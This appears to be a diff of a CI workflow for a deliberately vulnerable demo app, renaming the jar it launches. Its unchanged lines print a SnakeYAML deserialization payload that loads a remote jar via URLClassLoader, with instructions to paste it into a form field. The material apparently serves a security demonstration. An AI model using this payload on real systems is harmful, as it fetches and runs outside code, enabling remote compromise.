@@ -28,4 +28,4 @@ jobs:
         echo "App:     https://${{ secrets.NGROK_DOMAIN }}"
         echo "Payload: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"https://raw.githubusercontent.com/seal-sean-org/yaml-payload/main/yaml-payload.jar\"]]]]"
         echo "Paste the payload into the newsletter name field and click Unlock"
-        java -jar target/maven-demo-1.0.0.jar
+        java -jar target/seans-surf-and-skate-1.0.0.jar
